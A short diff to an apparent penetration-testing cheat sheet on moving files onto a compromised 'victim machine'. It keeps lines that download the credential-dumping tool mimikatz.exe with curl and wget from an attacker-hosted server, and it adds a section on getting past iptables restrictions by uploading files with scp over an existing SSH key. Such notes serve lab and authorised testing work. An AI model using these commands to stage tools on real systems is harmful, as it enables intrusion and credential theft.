@@ -53,3 +53,19 @@ curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
 ```
 wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe
 ```
+
+#### Bypass IPtable using SCP through SSH
+```
+In the case of IPtable restrict the possibility to upload a file on the victim machine.
+If you have a ssh connection using a id-rsa key, you could try the SCP tool to upload the file through the SSH connection.
+
+➤ Prerequisite : Have a ssh connection (id-rsa)
+
+➤ Error :
+wget -O test.txt http://192.168.1.1:443/test.txt
+--2022-03-13-- http://192.168.1.1:443:test.txt
+Connecting to 192.168.1.1:443 ...
+
+➤ Command :
+root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1 
+```
